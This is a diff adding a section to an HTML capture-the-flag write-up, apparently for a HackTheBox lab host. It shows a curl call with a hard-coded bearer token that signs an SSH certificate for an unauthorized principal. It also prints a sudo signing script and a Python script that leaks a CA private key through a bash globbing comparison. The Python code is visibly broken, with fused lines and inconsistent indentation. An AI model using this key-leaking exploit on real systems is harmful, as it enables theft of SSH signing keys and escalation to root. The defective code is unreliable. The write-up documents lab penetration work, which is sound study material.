@@ -155,6 +155,161 @@ public_key=$(cat $public_key_file)
 curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
 </pre></code>
 
+<p>This script, with the help of external resources, can be explained as follows:</p>
+<ol>
+  <li>The script requires three arguments: <code>publicKeyFile</code>, <code>username</code>, and <code>principal</code>.</li>
+  <li>Sends a CURL request to <code>signserv.ssg.htb</code> to sign the public key.</li>
+</ol>
+<p>What we need now is to make an ssh key pair and sign it the same way we did last time but instead of doing it manually we will use the script</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819223034.png" alt="key signing pre">
+
+<p>Going for support after testing all the other principals with failure</p>
+<p>SSH to the new host </p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224247.png" alt="SSH to new host">
+
+<p>In the ssg host as support</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224355.png" alt="new host as support">
+
+<p>Reading the '/etc/ssh/auth_principals' we see an interesting finding</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819224858.png" alt="auth principals">
+
+<p>zzinter have a principal called zzinter_temp so we can specify it while calling the script allowing us to ssh as zzinter </p>
+<p>However running the script with those parameters will give us an error because of this specific condition</p>
+<pre style="background-color: black; color: white;"><code>
+  if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+</code></pre>
+<p>We cannot call the script using the zzinter arguments so we will use the curl command</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819233918.png" alt="curl command">
+
+<p>SSH like we always do </p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819234113.png" alt="zzinter user">
+
+<p>Running this command to check for sudo permissions</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240819234157.png" alt="sudo -l">
+
+<p>the script is as follows</p>
+    
+<pre style="background-color: black; color: white;"><code>
+
+#!/bin/bash
+
+usage () {
+    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
+    exit 1
+}
+
+if [ "$#" -ne 5 ]; then
+    usage
+fi
+
+ca_file="$1"
+public_key_file="$2"
+username="$3"
+principal_str="$4"
+serial="$5"
+
+if [ ! -f "$ca_file" ]; then
+    echo "Error: CA file '$ca_file' not found."
+    usage
+fi
+
+itca=$(cat /etc/ssh/ca-it)
+ca=$(cat "$ca_file")
+if [[ $itca == $ca ]]; then
+    echo "Error: Use API for signing with this CA."
+    usage
+fi
+
+if [ ! -f "$public_key_file" ]; then
+    echo "Error: Public key file '$public_key_file' not found."
+    usage
+fi
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if ! [[ $serial =~ ^[0-9]+$ ]]; then
+    echo "Error: '$serial' is not a number."
+    usage
+fi
+
+ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"
+    
+</code></pre>
+
+<ol>
+  <li>Ensures exactly 5 arguments are provided: <code>ca_file</code>, <code>public_key_file</code>, <code>username</code>, <code>principal</code>, and <code>serial</code>.</li>
+  <li>Checks if the provided CA file matches <code>/etc/ssh/ca-it</code>. If the CA file matches, it outputs an error message and exits, instructing the user to use the API instead. It intends not to allow us to use the <code>ca-it</code> key with the script.</li>
+  <li>Uses the same principals.</li>
+  <li>Adds a serial number.</li>
+  <li>Uses <code>ssh-keygen</code> to sign the provided public key with the specified CA file, serial number, identity, validity, and principals.</li>
+</ol>
+
+<p>To exploit this script I got help from a very good friend where he explained a vulnerability in bash
+as he mentioned:  </p>
+<blockquote>
+  <p><strong>axu:</strong> As we know, BASH script tends to be vulnerable when it acts as a role of designed program. Because it is a very "soft" language that we can use various substitutions for certain codes. For example, the wildcard <code>*</code> represents a placeholder for arbitrary characters. And this script suffers from the Bash Globbing Vulnerability. It intends to stop us using the <code>cat-it</code> key, by comparing our provided CA and the original one inside <code>/etc/ssh</code> directory. Therefore, we can leak the original key by trying base64 characters (format for an RSA key) one by one adding wildcard <code>*</code> at the end, identified by the error messages.</p>
+</blockquote>
+
+<p>Using his script to help us leak the ca-it key</p>
+<pre style="background-color: black; color: white;"><code>
+ 
+import subprocess
+# SSH key elements 
+header = "-----BEGIN OPENSSH PRIVATE KEY-----" 
+footer = "-----END OPENSSH PRIVATE KEY-----" 
+ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" key = [] 
+line= 0 
+# Iterates over each character to test if it's the next correct one 
+while True: 
+	for char in ba64chars: 
+	# Constructs a test key with * 
+	testKey = f"{header}\n{''.join(key)}{char}*" 
+	with open("ca-test", "w") as f: 
+		f.write(testKey) 
+	proc = subprocess.run( 
+	["sudo", "/opt/sign_key.sh", "ca-test", "xpl.pub", "root", "root_user", "1"],
+	capture_output=True 
+	) 
+	# If matched, Error code 1 
+	if proc.returncode == 1: 
+	key.append(char) 
+	# Adds a newline every 70 characters 
+		if len(key) > 1 and (len(key) - line) % 70 == 0: 
+			key.append("\n") 
+			line += 1 
+		break 
+	else: 
+		break 
+# Constructs the final SSH key from the discovered characters 
+caKey = f"{header}\n{''.join(key)}\n{footer}" 
+print("The final leaked ca-it is: ", caKey) 
+with open("ca-it", "w") as f: 
+	f.write(caKey)
+
+</code></pre>
+    
 <p>Using the provided script, we discover the 'Bash Globbing Vulnerability' and exploit it to leak the CA key.</p>
 <img src="/img/Ressource_screenshot/Pasted image27.png" alt="Leaking CA key">
 
